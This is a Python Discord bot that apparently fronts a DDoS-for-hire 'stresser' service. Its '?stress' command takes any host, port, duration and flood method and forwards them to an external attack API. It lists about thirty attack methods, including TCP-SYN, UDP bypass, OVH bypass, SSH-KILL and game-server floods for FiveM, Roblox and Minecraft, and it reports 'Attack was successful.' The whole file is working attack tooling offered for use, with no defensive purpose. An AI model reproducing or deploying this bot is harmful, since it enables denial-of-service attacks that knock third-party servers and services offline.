import discord
import requests
from discord.ext import commands

TOKEN = "your discord token here"
API_BASE_URL = "you api here"

AVAILABLE_METHODS = [
    "MIXAMP", "DNS", "NTP", "DVR",
    "OVH-TCP", "SOCKET", "TCP-AMP", "TCP-SYN", "TCP", "OVH-TCPV2",
    "UDP-BYPASSV2", "OVH-UDP", "VSE", "UDP-BYPASS",
    "NFO", "SSH-KILL", "HANDSHAKE", "DISCORD",
    "FIVEM-BYPASS", "GAME", "MC-DROP", "ROBLOX", "SAMP-BYPASS",
    "HTTPS-MIX", "HTTP-BROWSER",
    "FLOODER",
    "ACK", "UDPX",
    "HTTPS-BASS", "HTTPS-CYRUS",
    "HTTP-STUN"
]

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="?", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"{bot.user.name} has connected to Discord!")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if isinstance(message.channel, discord.DMChannel):
        await message.channel.send("Join the Discord server to use this bot your discord server link here.")
        return

    await bot.process_commands(message)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command not found. Type `?help` for available commands.")
    elif isinstance(error, commands.BadArgument):
        await ctx.author.send("Invalid command arguments. Usage: ?stress [host] [port] [time] [method]")
    else:
        raise error

@bot.group(name="help", invoke_without_command=True)
async def help_command(ctx):
    embed = discord.Embed(title="Bot Commands", description="Here are the available commands:", color=discord.Color.blue())
    embed.add_field(name="?stress [host] [port] [time] [method]", value="Sends the stress command to the API with the specified parameters.", inline=False)
    await ctx.send(embed=embed)


@bot.group(name="method", invoke_without_command=True)
async def method_command(ctx):
    embed = discord.Embed(title="Available Methods", description="Here are the available methods:", color=discord.Color.blue())
    embed.add_field(name="Methods", value=", ".join(AVAILABLE_METHODS), inline=False)
    await ctx.send(embed=embed)

@bot.command(name="stress")
async def stress(ctx, host: str, port: int, time: int, method: str):
    if method not in AVAILABLE_METHODS:
        await ctx.send(f"Invalid method. Please choose from the available methods: {', '.join(AVAILABLE_METHODS)}")
        return

    response = requests.get(API_BASE_URL.format(host=host, port=port, time=time, method=method))

    if response.status_code == 200:
        json_response = response.json()
        if json_response.get("success"):
            await ctx.send("Attack was successful.")
        else:
            error_message = json_response.get("error", "Unknown error; Please use (?help) for help or dm an Admin.")
            await ctx.send(f"Error: {error_message}")
    else:
        await ctx.send("Error: Unable to send command to the API.")

bot.run(TOKEN)

